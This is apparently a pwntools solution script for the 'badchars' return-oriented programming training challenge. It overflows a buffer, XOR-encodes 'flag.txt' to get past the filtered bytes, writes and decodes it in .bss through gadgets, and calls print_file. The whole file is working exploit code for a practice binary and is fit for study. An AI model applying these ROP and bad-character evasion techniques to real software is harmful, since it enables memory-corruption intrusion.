#!/bin/python3
from pwn import *
from Crypto.Util.number import bytes_to_long

p = process('./badchars')
e = ELF('./badchars')
r = ROP('./badchars')


offset = 0x7ffca4bda698 - 0x7ffca4bda670

payload = b'A'*offset
payload += p64(r.find_gadget(['pop r12','pop r13','pop r14','pop r15','ret']).address) # we will pop bss into r13 and flag.txt into r12

payload += xor(b'flag.txt', 42) # xor with a random char to xor back later
payload += p64(e.bss()) # addr of readable and writable empty section that is big enough for "flag.txt" (can also use .data)
assert(bytes_to_long(e.section('.bss')) == 0) # section should be empty
payload += p64(0) # filler
payload += p64(0) # filler
payload += p64(0x400634) # mov [r13], r12 gadget. Move 'flag.txt' into address in r13 (bss)

# unxor data in bss:
for i in range(len(b'flag.txt')):
	payload += p64(r.find_gadget(['pop r14', 'pop r15', 'ret']).address)
	payload += p64(42) # thing we are xoring by
	payload += p64(e.bss() + i) # xor each byte at a time, starting at bss addr
	payload += p64(0x400628) # xor [r15], r14b gadget

payload += p64(r.find_gadget(['pop rdi', 'ret']).address) # pop bss into rdi (which is now flag.txt)
payload += p64(e.bss()) 
payload += p64(e.plt['print_file']) # call print_file with value in rdi, (which is flag.txt)

p.sendline(payload)

p.interactive()


'''
0x0000000000400634: mov qword ptr [r13], r12; ret;
0x0000000000400628: xor byte ptr [r15], r14b; ret; 
'''